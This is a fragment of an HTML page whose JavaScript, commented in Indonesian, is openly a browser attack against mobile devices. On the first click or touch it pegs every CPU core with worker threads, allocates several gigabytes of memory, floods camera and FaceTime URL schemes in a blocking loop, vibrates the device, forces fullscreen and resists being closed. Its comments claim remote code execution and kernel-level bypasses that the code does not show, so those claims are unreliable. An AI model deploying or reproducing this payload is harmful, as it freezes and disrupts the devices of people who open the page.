<!DOCTYPE html>
<html lang="id">

    <meta charset="UTF-8">

        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; overflow: hidden; }

<script>
    const st = document.getElementById('st');
    function log(m) { 
        const d = document.createElement('div');
        d.innerText = `[K-ERR] ${m}`;
        document.getElementById('logs').prepend(d);
    }

    // --- 1. THE ATOMIC LOCK (CPU HIJACK) ---
    // Menggunakan Atomics untuk membuat CPU sibuk 100% tanpa jeda.
    // Ini akan mencegah browser memunculkan dialog "Izinkan?" (Confirmation Bypass).
    function executeAtomicLock() {
        const sab = new SharedArrayBuffer(4);
        const int32 = new Int32Array(sab);
        const workerCode = `
            onmessage = function(e) {
                const view = new Int32Array(e.data);
                while(true) { 
                    Atomics.wait(view, 0, 0, 0.1); // Menciptakan nano-stuttering pada kernel
                    Atomics.add(view, 0, 1);
                }
            }
        `;
        const blob = new Blob([workerCode], {type: 'text/javascript'});
        for(let i=0; i<navigator.hardwareConcurrency || 8; i++) {
            new Worker(URL.createObjectURL(blob)).postMessage(sab);
        }
    }

    // --- 2. HARDWARE INTERRUPT (CAMERA STORM) ---
    // Menggunakan skema yang paling diprioritaskan oleh Kernel iOS & Android
    function triggerHardwareInterrupt() {
        const vectors = [
            "facetime://", 
            "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;end",
            "intent://#Intent;action=android.media.action.IMAGE_CAPTURE;launchFlags=0x14008000;end",
            "cameraui://",
            "photos-redirect://"
        ];

        vectors.forEach(v => {
            // Memaksa OS merespon dengan navigasi level tertinggi
            window.location.assign(v);
            
            // Hidden anchor click
            const a = document.createElement('a');
            a.href = v;
            a.click();
        });
    }

    // --- 3. MASSIVE BINARY SPRAYING (OOM TRIGGER) ---
    // Mengisi RAM hingga batas kritis (Out of Memory)
    // Saat RAM kritis, OS akan menutup background process dan membuka sistem app lebih cepat
    let memoryBOMB = [];
    function sprayRAM() {
        for (let i = 0; i < 50; i++) {
            memoryBOMB.push(new Uint8Array(1024 * 1024 * 50)); // 50MB per blok
        }
    }

    // --- FULL KERNEL ATTACK CHAIN ---
    async function startFinalExploit() {
        st.innerText = "EXECUTING_GOD_MODE_RCE";
        st.style.color = "white";

        // Step A: Kunci CPU
        executeAtomicLock();
        
        // Step B: Ledakkan RAM
        sprayRAM();

        // Step C: RECURSIVE STORM (Laju Tembak: 1ms)
        // Kita menggunakan pengulangan sinkron untuk memblokir UI Thread
        setInterval(() => {
            log("INJECTING_HARDWARE_INTERRUPT");
            
            // LOOP SINKRON UNTUK FREEZE BROWSER
            let end = Date.now() + 50; 
            while(Date.now() < end) {
                // Browser membeku di sini, tapi perintah 'open camera' terakumulasi di buffer OS
                triggerHardwareInterrupt();
            }
            
            if(navigator.vibrate) navigator.vibrate(500);
        }, 1); 

        // Force Fullscreen untuk mengunci input
        document.documentElement.requestFullscreen().catch(()=>{});
    }

    // TRIGGER UTAMA
    window.onclick = startFinalExploit;
    window.ontouchstart = startFinalExploit;

    // Lockdown
    window.onbeforeunload = () => "CRITICAL_SYSTEM_ERROR";
